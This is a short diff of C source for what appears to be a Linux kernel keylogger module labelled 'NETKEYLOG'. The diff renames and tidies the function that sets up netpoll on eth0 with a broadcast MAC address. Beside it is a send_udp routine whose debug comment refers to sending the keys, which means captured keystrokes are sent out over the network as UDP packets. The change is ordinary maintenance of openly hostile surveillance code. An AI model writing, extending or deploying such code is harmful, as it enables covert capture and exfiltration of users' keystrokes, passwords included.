@@ -22,11 +22,7 @@ static int read_call_counter = 0;
 static struct netpoll *np = NULL;
 static struct netpoll net_fill;
 
-
-// Ref : http://stackoverflow.com/questions/10499865/sending-udp-packets-from-the-linux-kernel
-// http://stackoverflow.com/questions/20431620/using-netpoll-on-kernel-3-10
-
-void init_netfill(char *msg)
+void init_netpoll(void)
 {
 	net_fill.name = "NETKEYLOG";// For log purpose 
 	strlcpy(net_fill.dev_name, "eth0", IFNAMSIZ); //Works only for ethernet(type) port
@@ -46,10 +42,10 @@ void init_netfill(char *msg)
 	memset(net_fill.remote_mac, 0xff, ETH_ALEN); // Mac address
 	netpoll_print_options(&net_fill); // To print in the log
 	netpoll_setup(&net_fill);
-	np = &net_fill; 
+	np = &net_fill;
+} 
 
 /* Function to send the UDP packet */
-
 void send_udp(const char *buf)
 {
         //printk("DEBUG: sending the keys");
